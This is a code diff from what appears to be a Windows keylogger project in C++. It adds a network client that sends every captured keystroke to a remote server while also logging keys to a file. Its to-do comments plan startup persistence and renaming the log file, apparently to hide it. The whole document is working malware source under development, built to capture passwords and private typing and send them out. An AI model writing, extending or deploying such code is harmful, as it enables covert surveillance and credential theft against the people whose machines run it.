@@ -18,18 +18,24 @@
 #include <iostream>
 #include <fstream>
 #include <thread>
+#include <winsock2.h>
 
-void writeKeyStroke(int trueKey)
+void writeKeyStroke(int trueKey, SOCKET sObjC)
 {
     std::ofstream file;
     file.open("logs.txt", std::ios::app);
     char trueKeyC = static_cast<char>(trueKey);
+    std::cout << trueKeyC;
     if (trueKey == ENTER)
     {
         file << "\n";
     } 
     else 
     {
+        if (sObjC != 1) 
+        {
+            send(sObjC, &trueKeyC, ((strlen(&trueKeyC))), MSG_OOB);
+        }
         file << trueKeyC;
     }
     file.close();
@@ -39,6 +45,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
     //FreeConsole();
+    SOCKET sObjClient = initClient();
     Maps vkMaps;
     vkMaps.initializeMaps();
     while (true)
@@ -52,7 +59,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 int specialKey = vkMaps.searchAsciiMaps(i);
                 if (isShiftPressed() == 1) 
                 {
-                    writeKeyStroke(findShiftPlusKey());
+                    writeKeyStroke(findShiftPlusKey(), sObjClient);
                 }
                 else if (vkMaps.searchMiscMaps(i) != 1) 
                 {
@@ -61,12 +68,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 }
                 else if (vkMaps.searchAsciiMaps(i) != 1) 
                 {
-                    writeKeyStroke(specialKey);
+                    writeKeyStroke(specialKey, sObjClient);
                 }
                 else 
                 {
                     int getCapOrLowKey = isCapslockOn(i);
-                    writeKeyStroke(getCapOrLowKey);
+                    writeKeyStroke(getCapOrLowKey, sObjClient);
                 }
                 key = 0;
             }
@@ -75,13 +82,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 }
 
 /*
-    Notes
+        Notes
     
 
-    To-Do list
+        To-Do list
 
-    in ks2server.cpp:
+    ~ figure out why client is sending additional junk data to the server. (writekeystroke function)
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
-    ~ find a way to run keylogger and client model asynchronously.
+    ~ change keystroke generated filename from logs.txt to something else.
+
 */
